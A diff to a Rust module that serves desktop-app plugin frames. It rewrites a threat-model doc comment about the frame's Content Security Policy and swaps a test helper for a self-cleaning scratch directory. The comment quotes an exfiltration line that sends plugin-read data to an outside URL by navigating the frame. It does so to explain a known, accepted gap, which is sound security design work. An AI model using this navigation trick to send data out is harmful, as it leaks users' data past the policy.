@@ -49,11 +49,14 @@ fn escape_attribute(value: &str) -> String {
 ///
 /// What it does not close, accepted and documented: a script-initiated navigation of the
 /// frame itself. CSP has no directive for it (`navigate-to` was specified and dropped, and
-/// never shipped), so `location.assign('https://…?d=' + payload)` still leaves. This is
-/// not an escalation: a page the plugin navigates itself to holds only the permissions the
-/// plugin already had, so it reaches nothing the plugin author could not reach anyway. A
-/// hostile or compromised plugin is the threat the install-time permission list exists
-/// for, not one this policy is meant to answer. See Task 3a's concern 9.
+/// never shipped), so `location.assign('https://…?d=' + payload)` still leaves, carrying
+/// whatever the plugin had already read. That is one-way: the page it lands on cannot take
+/// the bridge over, because `PluginFrame.svelte` binds one bridge per frame and refuses a
+/// second `atlas:hello` from an already-bound window. A same-frame navigation keeps the
+/// same `Window`, so only the host can reset a binding, by recreating the iframe through
+/// the frame's `reload()`. A hostile or compromised plugin is still the threat the
+/// install-time permission list exists for, not one this policy is meant to answer. See
+/// Task 3a's concern 9.
 ///
 /// This does not restrict `postMessage`, which CSP does not govern, so everything a
 /// plugin is meant to do still works: the bridge is the only way in.
@@ -239,16 +242,13 @@ pub fn handle<R: Runtime>(
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::scratch::ScratchDir;
     use crate::plugins::registry::{plugins_dir, record_install, SourceRef};
 
-    fn scratch_dir(label: &str) -> PathBuf {
-        let dir = std::env::temp_dir().join(format!(
-            "atlas-desktop-plugins-protocol-test-{label}-{}-{}",
-            std::process::id(),
-            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()
-        ));
-        std::fs::create_dir_all(&dir).unwrap();
-        dir
+    /// A scratch app-data directory that removes itself when the test's binding drops, so
+    /// a run leaves nothing behind in the OS temp dir.
+    fn scratch_dir(label: &str) -> ScratchDir {
+        ScratchDir::new(&format!("atlas-desktop-plugins-protocol-test-{label}", )).unwrap()
     }
 
     /// An installed, enabled, compatible plugin with `main.js` and a `style.css`.
